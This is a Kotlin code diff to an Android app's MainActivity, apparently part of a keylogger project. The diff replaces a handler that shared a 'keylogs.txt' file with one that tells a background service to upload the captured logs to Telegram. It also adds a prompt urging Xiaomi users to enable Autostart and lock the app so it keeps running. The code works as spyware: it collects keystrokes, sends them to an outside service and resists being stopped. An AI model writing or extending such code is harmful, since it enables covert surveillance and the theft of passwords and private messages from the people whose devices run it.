@@ -83,24 +83,16 @@ class MainActivity : AppCompatActivity() {
             }
         }
         
+        if (android.os.Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true)) {
+            Toast.makeText(this, "MIUI Detected: Please enable 'Autostart' and Lock the app in Recents to prevent stopping.", Toast.LENGTH_LONG).show()
+        }
+
         findViewById<Button>(R.id.downloadLogsButton).setOnClickListener {
-            try {
-                val file = java.io.File(filesDir, "keylogs.txt")
-                if (!file.exists() || file.length() == 0L) {
-                    Toast.makeText(this, "No logs found yet", Toast.LENGTH_SHORT).show()
-                } else {
-                    val text = file.readText()
-                    // Share as text
-                    val intent = Intent(Intent.ACTION_SEND).apply {
-                        type = "text/plain"
-                        putExtra(Intent.EXTRA_TEXT, text)
-                        putExtra(Intent.EXTRA_SUBJECT, "Keylogs")
-                    }
-                    startActivity(Intent.createChooser(intent, "Share Keylogs"))
-                }
-            } catch (e: Exception) {
-                Toast.makeText(this, "Error reading logs: ${e.message}", Toast.LENGTH_SHORT).show()
-            }
+            // Send broadcast to service to upload logs
+            val intent = Intent("com.example.telegramsender.ACTION_FORCE_SEND")
+            intent.setPackage(packageName) // Restrict to own app
+            sendBroadcast(intent)
+            Toast.makeText(this, "Requesting Log Upload to Telegram...", Toast.LENGTH_SHORT).show()
         }
     }
     
